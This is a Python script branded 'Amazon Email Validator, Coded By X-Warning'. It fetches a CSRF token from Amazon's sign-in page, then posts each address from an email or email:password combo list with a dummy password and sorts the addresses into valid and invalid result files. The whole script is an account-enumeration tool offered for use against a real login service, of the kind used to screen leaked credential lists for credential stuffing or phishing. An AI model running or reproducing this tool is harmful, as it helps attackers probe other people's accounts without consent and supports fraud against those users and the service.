import requests
import os
import re
import sys
from colorama import Fore, Style, init

# ----------------------------------------------------------------------
# Initialise colourama and clear screen
# ----------------------------------------------------------------------
init()
os.system('cls' if os.name == 'nt' else 'clear')

# ----------------------------------------------------------------------
# Banner
# ----------------------------------------------------------------------
print('_' * 50)
print('        Amazon Email Validator')
print('        Coded By X-Warning')
print('_' * 50)
print()

# ----------------------------------------------------------------------
# Helper: fetch the login page and extract CSRF token
# ----------------------------------------------------------------------
def get_csrf_token():
    """GET the Amazon sign‑in page and return the CSRF token value."""
    url = 'https://www.amazon.com/ap/signin'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }
    try:
        resp = requests.get(url, headers=headers)
        match = re.search(r'<input\s+name="csrf_token"\s+value="([^"]+)"', resp.text)
        return match.group(1) if match else None
    except Exception as e:
        print(Fore.RED + f'Error fetching login page: {e}' + Style.RESET_ALL)
        return None

# ----------------------------------------------------------------------
# Helper: check a single email (password is ignored – we use a dummy)
# ----------------------------------------------------------------------
def check_email(email, csrf_token):
    """
    Attempt a login with a dummy password.
    Returns True if the email is recognized (i.e., we move past the sign‑in screen).
    """
    dummy_password = 'dummy'
    url = 'https://www.amazon.com/ap/signin'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Referer': 'https://www.amazon.com/ap/signin'
    }
    data = {
        'email': email,
        'password': dummy_password,
        'csrf_token': csrf_token,
        'openid.pape.max_auth_age': '0',
        'openid.return_to': 'https://www.amazon.com/dp/B07Z8PWC6R/?_encoding=UTF8&ref_=nav_newcust',
        'openid.identity': 'http://specs.openid.net/auth/2.0/identifier_select',
        'openid.assoc_handle': 'usflex',
        'openid.mode': 'checkid_setup',
        'openid.claimed_id': 'http://specs.openid.net/auth/2.0/identifier_select',
        'openid.ns': 'http://specs.openid.net/auth/2.0'
    }

    try:
        resp = requests.post(url, headers=headers, data=data, allow_redirects=True)
        # If the response still contains "Sign in" → email not recognized
        if 'Sign in' in resp.text:
            return False
        # Otherwise we moved past the sign‑in screen → email is recognized
        return True
    except Exception as e:
        print(Fore.RED + f'Error checking {email}: {e}' + Style.RESET_ALL)
        return False

# ----------------------------------------------------------------------
# Main workflow
# ----------------------------------------------------------------------
def main():
    # Ensure results directory exists
    os.makedirs('Results', exist_ok=True)

    # Input file – can be email:password lines (password ignored) or just emails
    list_file = input(Fore.YELLOW + '[+] Input Email List (e.g. emails.txt): ' + Style.RESET_ALL).strip()
    if not os.path.isfile(list_file):
        print(Fore.RED + f'File not found: {list_file}' + Style.RESET_ALL)
        return

    # Pre‑fetch CSRF token once
    csrf = get_csrf_token()
    if not csrf:
        print(Fore.RED + 'Could not retrieve CSRF token – aborting.' + Style.RESET_ALL)
        return

    # Open output files
    valid_file = open('Results/Valid.txt', 'w', encoding='utf-8')
    invalid_file = open('Results/Invalid.txt', 'w', encoding='utf-8')

    print('-' * 50)
    total = sum(1 for _ in open(list_file, 'r', encoding='utf-8'))
    processed = 0

    with open(list_file, 'r', encoding='utf-8') as f:
        for line in f:
            raw = line.strip()
            if not raw:
                continue

            # Extract email part (ignore password if present)
            email = raw.split(':')[0].strip()

            processed += 1
            print(f'[{processed}/{total}] Checking: {email}', end='\r')

            if check_email(email, csrf):
                print(Fore.GREEN + f'[VALID]   {email}' + Style.RESET_ALL)
                valid_file.write(email + '\n')
            else:
                print(Fore.RED + f'[INVALID]{email}' + Style.RESET_ALL)
                invalid_file.write(email + '\n')

    # Cleanup
    valid_file.close()
    invalid_file.close()
    print('\n' + '-' * 50)
    print(Fore.CYAN + 'Processing complete.' + Style.RESET_ALL)
    print(f'Valid emails saved to: {Fore.GREEN}Results/Valid.txt{Style.RESET_ALL}')
    print(f'Invalid emails saved to: {Fore.RED}Results/Invalid.txt{Style.RESET_ALL}')

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(Fore.RED + '\nInterrupted by user.' + Style.RESET_ALL)
        sys.exit(0)
